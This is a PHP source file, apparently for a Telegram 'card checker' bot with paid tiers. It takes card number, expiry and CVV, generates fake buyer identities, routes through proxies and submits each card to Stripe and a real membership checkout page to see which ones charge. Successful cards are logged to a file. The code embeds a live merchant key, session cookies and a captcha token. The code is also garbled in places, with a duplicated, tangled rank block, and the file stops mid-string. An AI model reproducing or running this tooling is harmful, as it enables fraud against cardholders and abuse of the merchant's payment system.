<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";
    $gate = "STRIPE CCN 10$";
    $gcm  = "/ccn";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/ccn|\.ccn|!ccn)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> You're not Premium user❌ @$username </b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• 𝚈𝚘𝚞 𝙳𝚞𝚖𝚋 𝙰𝚜𝚜 𝙷𝚘𝚕𝚎 ! </b>         𝚃𝚎𝚡𝚝 𝚂𝚑𝚘𝚞𝚕𝚍 𝙾𝚗𝚕𝚢 𝙲𝚘𝚗𝚊𝚝𝚒𝚗 <code>/ccn cc|mm|yy|cvv •', $message_id);
            exit();
  }
$r = "0";

$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//



//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard,"<b>
𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...
</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...
</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

  if (empty($scheme)) {
      $scheme = "N/A";
  }
  if (empty($type)) {
      $type = "N/A";
  }
  if (empty($brand)) {
      $brand = "N/A";
  }
  if (empty($bank)) {
      $bank = "N/A/N/A";
  }
  if (empty($name)) {
      $name = "N/A";
  }
  if (empty($emoji)) {
      $emoji = "N/A";
  }
  if (empty($currency)) {
      $currency = "N/A";
  }

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...
</b>");


  //==================[BIN LOOK-UP]======================//

  $ch = curl_init();

  $bin = substr($cc, 0, 6);

  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $ch = curl_init();

    $bin = substr($cc, 0, 6);

    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $alpha2 = $binna['country']['alpha2'];
    $emoji = $binna['country']['emoji'];
    $type = $binna['type'];
    $category = $binna['category'];
    $bank = $binna['bank']['name'];
    $url = $binna['bank']['url'];
    $phone = $binna['bank']['phone'];
    curl_close($ch);

    $bank = "$bank";
    $country = "$country $emoji ";
    $bin = "$bin - ($alpha2) -[$emoji] ";
    $bininfo = "$type - $brand - $category";
    $url = "$url";
    $type = strtoupper($type);


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...
</b>");  
//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.6';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Path: /v1/payment_methods';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=a070fd6a-aa96-4483-81b9-34b45f7b69111e98c6&muid=47b3b239-b265-4845-813b-1dd9c2301397749a4a&sid=bb3d7e28-c6b8-4abf-8584-f192b63c0cd2a23726&pasted_fields=number&payment_user_agent=stripe.js%2F8de40c8431%3B+stripe-js-v3%2F8de40c8431%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=968610&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZGMrFyGyrq1G3mUExYwbtQb4kk5baLRlgcXxIiL9kdEpfmu6wUPtOvmSWGMbNG6I2RhUAh1PuBM76c3htvXm1QRcBnpULtz5tKpv30AE_GuhEDfa-4WsGtJz8U1aHs1Jlme2ZZf7mVY_yYj5jkr6cf245xZkWFB4yJABOrpvZ6HRRmL3D6PpqTI2b4JZEB8RbsTQtFTdqZlSWK_JbNtDnHGDKR4Ctt2yuLcIREztAldYC8GjbTgjXT_aRa4dc-2dQEPPZAYzsWsRSaVZHYolbrSxOd2OHREWcsusrQ69Rlq0DCc0McwQmRMbLRq0ciI2AYaufusfcZKxoC_JUtE4a6-YIhKhLVPD88AmCywSkNSM-DiUtoOknjzix1S8TwPWbbl8ojCxO-nPmLjST_bUClZWeEMGmjI6G3uN7qpj82Ec46MPgxCDcsAML_pO8emNgiXkdKCsEjRR3rsc-NBMtpvJkfqhgjJBcvvtKgAQUcyYLn280N8d2rTFcOdSUfI36NsVGNuV0EBqH--pHlooYEvrsmOPTN95mGs3zMxj2GQ_zy8DBre9qkyTaDjzlfz4qjG0s8_rjMDs4LbyD_so7dRVxMuvdpY5Fgqcf77cj9onBhGoDtBJWqxVQ65SUzL8KvNLCQQYfjrFztuP2xTV4UHyq-qsgbqQlxb0UHF7UOJxsuVRBsU_Xko8S09uNswIl3dUaONx4QYsF7EeE4nGQL4fbvax23IxzPv_YtCFGRGfP2ERAF9k0RIk5XiMEpq-FP68h5L1MOnLWx_XaNATGX_DtbHTsax2bfxJ0i78oQoxS3UEc6Bhk8KHAsbqE8YW0P822PMQaTxJ5OAPyzF6mjVcgWlg1nazOInieyWsQTvzab29FhK7C0WD80sUdRNkDY2TPwqQ2yr8w5WIQ7Cmogh2SVC64WAjdFg6bdKIWj5EFUEMmPupRb4njmXUO4cfxlz-icTauMq9Aun0mpjXxqeIbahlgwxVUGCBMyg84aYrWyA_cO8RpmZ6PtpcvdkTa4l_9lqNYJcOiwT5RWuOhPDAJPM3eQjkOT7B_kRkHygeHz3ROFLDtUyoa-FGSqgWNvevgnsxPHzMl6ATzICjjhhVmw6ETvdylX5I-Duc5A_ADuBtBsAG9l3tKDeg8NITXjfkLOu0L53BFmtRDdC30fkCU5a366VctDa2t1_V-LylZtELSBMmSe7JgnRs3PeklGju4B5ryXGJyC29nlzE_GX81b67GaviC5qIBqIDYRdPeoiJ_Fj_vSF7v18i8vJ6RjUsflBAgQw-fIvhdaN4vMS6WPcK-uD_8r42Ml8He4v-WeTfuqZK-z8bbLlWZMr_ez10vqUocF9MFs6BTFDNsyHfdSAV9OXcHeL3GJSY_a35_BPs-OfUK-7rMOncAHGizhewQsKvMtAChplQw1j4rxCTtRafzmwvc6PLdsZ73ukWBi1ZTNc3LQFmfvjqjoqLxa6axu2WfglL0vxc3G5Rxto-Ir1DJBgHtXOdS-DcKPgIx-VB0tycOW9GB87P3YAhUQ-RABDQGWswtzzqXycVbs6HglnNsSo1TtdXaYNqneqa-FzGIFcB9bf9zBDvkM5y1sS353-g35wGVWAGY5RukSrw-d3w9dWwIhConxCVqC4o9ljh89TATRCsi8-LQIX5lITzpQeZa8aJT3cTRSWK3M_ueSQLlV3LXR_Mp_AuGg1fU-jDeN-YCwc_yFsQTz2Lk-BUTsv8j6UBKJrIk9cZ0v1tO_HcDCSmgkmU-QRoeSNXIk916T0ofEiBmCE6KhCD9rDSHypmNy_0KgLh4vfXirUQm49YdGMPkc-7ngUELsIVA-w2AGUDrQNtTOnwCGM_p39QRy4txqt5RkvrOATL7O-xLfk7N-GROr7ZClvKxPU10PcUww1UdCmKs8FhK5a210v2KWzz2nBqEMdHuDoaPcBSOKaE3HpETKvx6V-dftHicGGT8ySgRV5OcMQKv6oI3lbY0cEnIcHtShk_T6Zj0uCsEGACcWJZ9vNxSilht-i3noEqBUPJvMmnQrY-sAFjC0vEeEojRlIWxSuLaXbLd8Hm29R8mIwCKQ5qwD6szEvWXY717Ln1kizZsBwokWh-tW7U7zwf6uGLukuVTPJ43DOGBBfD3lM6NleHDOZnr-H6hzaGFyZF9pZM4VmeRUomtyqDRiMzg4NGEyonBkAA.xEQ2CILi7xUS3fbxf-RzknJRKrc9Di2bsWeH4m83Ug8');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
//==================req 1end===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.yasminmogahedtv.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.yasminmogahedtv.com';
$headers[] =  'method: POST';
$headers[] =  'path: /membership-account/membership-checkout/';
$headers[] =  'scheme: https';
$headers[] =  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] =  'accept-language: en-US,en;q=0.6';
$headers[] =  'content-type: application/x-www-form-urlencoded';
$headers[] =  'cookie: __stripe_mid=47b3b239-b265-4845-813b-1dd9c2301397749a4a; PHPSESSID=i12a5ae7v3k19ekcaaelk15a32; pmpro_visit=1; __stripe_sid=bb3d7e28-c6b8-4abf-8584-f192b63c0cd2a23726';
$headers[] =  'origin: https://www.yasminmogahedtv.com';
$headers[] =  'referer: https://www.yasminmogahedtv.com/membership-account/membership-checkout/';
$headers[] =  'sec-fetch-dest: document';
$headers[] =  'sec-fetch-mode: navigate';
$headers[] =  'sec-fetch-site: same-origin';
$headers[] =  'user-agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=4&checkjavascript=1&other_discount_code=&username='.$lastname.'&password=mmmmmmmm&password2=mmmmmmmm&bemail='.$email.'%40gmail.com&bconfirmemail='.$email.'%40gmail.com&fullname=&telephone=3234267080&CardType=mastercard&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX8435&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));


sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...
</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);

  //======checker part end=========//


if (
    strpos($result2, 'Thank you for your membership.') !== false ||
    strpos($result2, "Membership Confirmation") !== false ||
    strpos($result2, 'Your card zip code is incorrect.') !== false ||
    strpos($result2, "Thank You For Donation.") !== false ||
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, "Success ") !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, "/donations/thank_you?donation_number=") !== false
) {

  $resp = "
Stripe Charge 10$ ✅
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
⌬ 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ Thanks For Your Donation.!🟢
⌬ 𝐂𝐨𝐝𝐞 ↯ [/ccn]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
⌬ 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code>
⌬ 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]


";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
file_put_contents('./ccs/charged.txt', $resp . PHP_EOL, FILE_APPEND);
}

elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {


$resp = "
Stripe Charge 10$ ✅
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
⌬ 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ Insufficent Fund
⌬ 𝐂𝐨𝐝𝐞 ↯ [/ccn]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
⌬ 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code>
⌬ 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]


";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result3, "incorrect_cvc") !== false) {
$resp = "
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> Mɪᴋᴇ Cʜᴋ <b>[<a href='t.me/MkDarkHub'>↯</a>]</b>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐝𝐞 ↯ [/ccn]

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank] 
⌬ $botu


";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {
$resp = "
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> Mɪᴋᴇ Cʜᴋ <b>[<a href='t.me/MkDarkHub'>↯</a>]</b>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐝𝐞 ↯ [/ccn]

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]


";
sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
$resp = "
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> Mɪᴋᴇ Cʜᴋ <b>[<a href='t.me/MkDarkHub'>↯</a>]</b>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐝𝐞 ↯ [/ccn]

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


else {
$resp = "
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> Mɪᴋᴇ Cʜᴋ <b>[<a href='t.me/MkDarkHub'>↯</a>]</b>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
